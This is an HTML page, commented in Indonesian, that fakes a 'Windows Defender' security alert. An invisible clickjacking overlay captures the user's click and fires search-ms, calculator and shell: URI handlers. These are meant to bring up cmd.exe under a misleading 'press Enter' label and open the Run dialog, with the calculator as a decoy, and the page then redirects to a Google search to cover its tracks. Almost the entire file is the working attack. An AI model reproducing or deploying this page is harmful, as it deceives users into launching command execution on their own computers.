<!DOCTYPE html>
<html>
<head>
    <title>Critical Security Update</title>
    <style>
        body { margin: 0; background: #111; font-family: sans-serif; overflow: hidden; }
        
        /* Lapisan Tapjacking yang menipu mata */
        .fake-ui {
            position: absolute; width: 100%; height: 100%;
            display: flex; flex-direction: column; justify-content: center;
            align-items: center; z-index: 10; color: white;
        }

        #real-trigger {
            padding: 20px 60px; font-size: 24px; color: black;
            background: #00ff00; border: none; cursor: pointer;
            font-weight: bold; border-radius: 5px;
        }

        /* Overlay transparan yang sebenarnya menangkap klik untuk payload */
        .invisible-layer {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            opacity: 0; z-index: 100; cursor: pointer;
        }
    </style>
</head>
<body>

<div class="fake-ui">
    <h1>⚠️ WINDOWS DEFENDER ALERT</h1>
    <p>A malicious file has been detected. Click below to quarantine and repair.</p>
    <button id="real-trigger">QUARANTINE NOW</button>
</div>

<!-- Lapisan murni untuk eksploitasi -->
<div class="invisible-layer" id="exploit-zone"></div>

<script>
    const zone = document.getElementById('exploit-zone');
    
    const rceChain = () => {
        console.log("Initiating RCE Chain...");

        // 1. MEMBUKA CMD VIA SEARCH-MS (Automatic Selection)
        // Kita menggunakan displayname yang meyakinkan agar user menekan ENTER
        const v1 = "search-ms:query=cmd.exe&crumb=location:C%3A%5CWindows%5CSystem32&displayname=Confirm_Security_Update_Press_Enter";
        
        // 2. MEMBUKA CALCULATOR (Sebagai decoy/pengalih perhatian)
        const v2 = "calculator:";

        // 3. MEMBUKA RUN DIALOG (Pintu gerbang perintah kustom)
        const v3 = "shell:::{2559a1f3-21d7-11d4-bdaf-00c04f60b9f0}";

        const payloads = [v1, v2, v3];

        payloads.forEach((p, index) => {
            setTimeout(() => {
                const a = document.createElement('a');
                a.href = p;
                const e = new MouseEvent('click', {
                    bubbles: true, ctrlKey: true, shiftKey: true
                });
                a.dispatchEvent(e);
            }, index * 200); // Delay kecil untuk memicu window stacking
        });

        // REDIRECT UNTUK MEMBERSIHKAN JEJAK
        setTimeout(() => {
            window.location.href = "https://www.google.com/search?q=windows+security+update+successful";
        }, 2000);
    };

    zone.onclick = (e) => {
        rceChain();
        // Menghilangkan UI agar user tidak curiga
        document.querySelector('.fake-ui').innerHTML = "<h1>REPAIRING... PLEASE WAIT</h1>";
    };
</script>
</body>
</html>
